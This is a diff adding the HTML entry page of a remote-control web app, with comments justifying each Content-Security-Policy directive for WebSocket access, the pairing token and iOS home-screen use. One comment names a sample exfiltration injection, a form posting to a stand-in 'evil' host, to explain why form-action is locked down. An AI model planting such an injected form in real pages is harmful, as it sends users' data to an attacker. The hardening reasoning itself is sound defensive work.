@@ -1,0 +1,71 @@
+<!doctype html>
+<!-- `lang` is a placeholder: App.tsx sets it from the host's `hello.locale`. -->
+<html lang="de">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Vertragus Remote</title>
+    <!--
+      Everything this page needs is in the bundle: fonts, icons and the manifest
+      are all same-origin, and nothing here widens `default-src 'self'` — which
+      is a claim about the line below, so it has to keep being true of it.
+
+      `connect-src 'self'` covers the WebSocket by spec — CSP3 matches a
+      ws:/wss: URL against an http/https `'self'` on the same host and port —
+      but the one device this client was written for is iOS Safari, and WebKit
+      blocked precisely that for years. So the server does NOT rely on the
+      derivation: `withWebSocketConnectSrc` in `staticFiles.ts` templates this
+      directive as it serves the page, appending `ws://<host:port>` taken from
+      the request's own Host header. Editing the text `connect-src 'self'` below
+      changes what that function matches on; `staticFiles.test.ts` fails if it
+      stops matching.
+
+      The bare schemes (`ws:` and `wss:` with no host) stay absent, and
+      templating is why that costs nothing: they would have allowed a socket to
+      ANY host on the internet — on a page whose localStorage holds the
+      long-lived pairing token — where this names one host and one port.
+
+      `manifest-src` has no entry of its own on purpose: it falls back to
+      `default-src`, which already allows the same origin the manifest is
+      served from. `base-uri 'none'` keeps an injected <base> from re-pointing
+      every relative asset URL in the bundle, and `form-action 'none'` is
+      spelled out because form submission is NOT covered by `default-src` —
+      without it an injected <form action="https://evil/"> plus a submit is an
+      exfiltration path the rest of this policy does not touch.
+      `frame-ancestors` is deliberately absent: it is ignored in a <meta>
+      policy and would only read as protection that is not there.
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'none'"
+    />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-content"
+    />
+    <meta name="color-scheme" content="dark light" />
+    <!--
+      Exactly one theme-color tag, no media-scoped variants: App.tsx rewrites
+      its content from the host's theme, and `querySelector` would only ever
+      find the first of several.
+    -->
+    <meta name="theme-color" content="#0e1013" />
+    <!--
+      Installed to a home screen this runs standalone, which is the difference
+      between "a browser tab over Tailscale" and an app. The manifest carries
+      the Android side; iOS ignores it for the home screen and reads the
+      apple-* tags and the apple-touch-icon below instead, so both exist.
+    -->
+    <link rel="manifest" href="./manifest.webmanifest" />
+    <link rel="icon" type="image/png" sizes="32x32" href="./icons/favicon-32.png" />
+    <link rel="apple-touch-icon" href="./icons/apple-touch-icon.png" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="apple-mobile-web-app-title" content="Vertragus" />
+    <meta name="format-detection" content="telephone=no" />
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/main.tsx"></script>
+  </body>
+</html>
